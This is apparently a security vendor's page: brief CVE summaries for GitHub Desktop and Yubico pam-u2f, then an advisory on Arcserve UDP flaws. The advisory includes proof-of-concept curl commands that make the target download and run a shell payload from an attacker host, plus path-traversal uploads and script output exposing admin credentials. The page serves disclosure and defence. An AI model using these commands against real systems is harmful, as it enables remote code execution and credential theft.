* ##### [CVE-2025-23040](https://www.tenable.com/cve/CVE-2025-23040)

  ###### medium

  GitHub Desktop is an open-source Electron-based GitHub app designed for git development. An attacker convincing a user to clone a repository directly or through a submodule can allow the attacker access to the user's credentials through the use of maliciously crafted remote URL. GitHub Desktop relies on Git to perform all network related operations (such as cloning, fetching, and pushing). When a user attempts to clone a repository GitHub Desktop will invoke `git clone` and when Git encounters a remote which requires authentication it will request the credentials for that remote host from GitHub Desktop using the git-credential protocol. Using a maliciously crafted URL it's possible to cause the credential request coming from Git to be misinterpreted by Github Desktop such that it will send credentials for a different host than the host that Git is currently communicating with thereby allowing for secret exfiltration. GitHub username and OAuth token, or credentials for other Git remote hosts stored in GitHub Desktop could be improperly transmitted to an unrelated host. Users should update to GitHub Desktop 3.4.12 or greater which fixes this vulnerability. Users who suspect they may be affected should revoke any relevant credentials.
* ##### [CVE-2025-23013](https://www.tenable.com/cve/CVE-2025-23013)

  ###### high

  In Yubico pam-u2f before 1.3.1, local privilege escalation can sometimes occur.

This software package has an issue that allows for an authentication bypass in some configurations. An attacker would require the ability to access the system as an unprivileged user. Depending on the configuration, the attacker may also need to know the user's password.

# Arcserve Unified Data Protection Multiple Vulnerabilities

Critical

[← View More Research Advisories](/security/research)
### Synopsis

**CVE-2023-41998****- Arcserve UDP Unauthenticated RCE**

(CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

An unauthenticated, remote attacker can execute code remotely via the downloadAndInstallPatch() routine within “com.ca.arcflash.rps.webservice.RPSService4CPMImpl.” This routine allows users to upload and execute arbitrary files.

For example, when triggering this method, a malicious actor can cause the service to download a zip file from an attacker-controlled URL to <UDP\_INSTALL\_DIR>\Engine\BIN\patch\. The zip file is subsequently decompressed and a decompressed EXE file with the same file name as the zip file (i.e., foo.exe zipped to foo.zip) is then executed.

**Proof of Concept**

```
# On <attacker-host>, create a malicious zip/exe to be hosted and later referenced
# Run a web server to serve the zip file
# The webroot should be the parent directory because the download URL must have at least 4 slashes
/tmp/download# python3 -m http.server -d ../
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

# On a separate terminal, run:
curl -ki -H 'Content-Type: text/xml' -d '<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/"><S:Body><ns2:downloadAndInstallPatch xmlns:ns2="http://webservice.arcflash.ca.com"><arg0>http://<attacker-host>:8000/download/shell_bind_tcp.zip</arg0></ns2:downloadAndInstallPatch></S:Body></S:Envelope>' 'https://<target-host>:8014/RPSWebServiceImpl/services/RPSService4CPMImpl'

**CVE-2023-41999 - Arcserve UDP Management Authentication Bypass**

(CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

Arcserve UDP management console supports authentication with a UUID (i.e.,ValidateUserByUUID()). An unauthenticated remote attacker can obtain a valid authentication UUID to login to the console.

Once authenticated, the attacker can perform actions that require authentication. For example, the attacker can grab the "Edge Account" (i.e., Administrative) credentials.

**Proof of Concept**

```
python3 arcserve_udp_console_auth_bypass.py <target-host>
[*] Getting hostUuid
        [+] hostUuid: b86e10f6-60d5-4244-82ce-8afe90fc0170
[*] Calling validateUserByUUID
        [+] Login OK
[*] Calling getEdgeAccount
        [+] username: administrator
        [+] domain  : .
        [+] encrypted password: ca942ee002fb24339b5ff64ccdd647b9d131cdd5db10b59ca3b20c796365500d
        [+] decrypted password: Password123
```

**CVE-2023-42000 - Arcserve UDP Agent Unauthenticated Path Traversal File Upload**

(CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

A path traversal vulnerability exists in com.ca.arcflash.ui.server.servlet.FileHandlingServlet.doUpload(). An unauthenticated remote attacker can exploit it to upload arbitrary files to any location on the file system where the UDP agent is installed.

**Proof of Concept**

```
echo -n 'malicious content' > /tmp/malicious_file
curl -ki -F 'file=@/tmp/malicious_file;filename=/../../../../../../../../../Windows/System32/malicious_file'  'https://<target-host>:8014/fileHandling?action=upload'
```

### Solution
